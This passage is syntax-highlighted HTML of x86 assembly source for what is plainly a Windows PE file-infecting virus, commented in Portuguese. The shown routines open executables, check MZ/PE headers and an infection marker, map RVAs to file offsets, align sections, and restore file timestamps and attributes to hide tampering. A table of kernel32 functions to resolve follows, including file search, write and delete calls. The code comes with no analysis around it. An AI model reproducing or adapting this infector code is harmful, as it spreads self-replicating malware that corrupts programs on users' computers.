       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;esi+=8</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileTime</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;restaura FILETIME</span><span class="sc0">
  </span><span class="sc5">puta_que_pariu</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infectou?</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ja_infectado</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Sleep2</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;se infectou, descansa um pouco</span><span class="sc0">
  </span><span class="sc5">ja_infectado</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">LOCAL_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;restaura atributos</span><span class="sc0">
  </span><span class="sc5">puta_merda</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LOCAL_DATA</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">le4</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                                 </span><span class="sc1">;buffer</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;rva para ler</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">;tamanho da leitura</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le_rva</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">le8</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                                 </span><span class="sc1">;buffer</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;rva para ler</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                   </span><span class="sc1">;tamanho da leitura</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le_rva</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">le_rva</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">))]</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">proximo_header</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;tira base da seá∆o do rva</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">caralho</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;aponta dentro?</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">converte</span><span class="sc0">
  </span><span class="sc5">caralho</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">proximo_header</span><span class="sc0">
  </span><span class="sc5">erro</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
  </span><span class="sc5">pula_stc</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">converte</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;some inicio da seá∆o</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;ajusta ponteiro</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">erro</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">12</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;le valor</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">erro</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pula_stc</span><span class="sc0">

</span><span class="sc5">alinha_file</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">alinha</span><span class="sc0">

</span><span class="sc5">alinha_mem</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">alinha</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">verifica</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;sinaliza erro</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc4">+</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">nao_deu</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;parÉmetro para CloseHandle</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fecha_arquivo</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fecha_arquivo</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fecha_arquivo</span><span class="sc0">                        </span><span class="sc1">;Ç um arquivo EXE?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pe_ptr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;vai atÇ PE header-4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fecha_arquivo</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">;là 1 dword</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fecha_arquivo</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fecha_arquivo</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">marca</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fecha_arquivo</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER.Pushad_eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;sinaliza n∆o infectado</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER.Pushad_ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;salva e remove handle</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nao_deu</span><span class="sc0">
  </span><span class="sc5">fecha_arquivo</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">nao_deu</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">reloctable</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">RELOCS</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc3">"Re"</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">kernel32</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.DLL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">kernel32API</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateThread"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VirtualAlloc"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetThreadPriority"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ResumeThread"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ReadFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VirtualFree"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetTickCount"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDriveTypeA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lstrlen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Sleep"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SuspendThread"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;org 01D2Ah</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc3">"CRC-"</span><span class="sc0">                                 </span><span class="sc1">;alinhado num multiplo de 249</span><span class="sc0">

</span><span class="sc5">final_virus</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">temp</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_ptr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">tsecao</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lugarloader</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">escreve</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">tamanho_total</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rnd</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">thread_id</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">thread_corrige</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">tabela</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">espera</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">infectou?</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">CreateThread_</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VirtualAlloc</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetThreadPriority</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
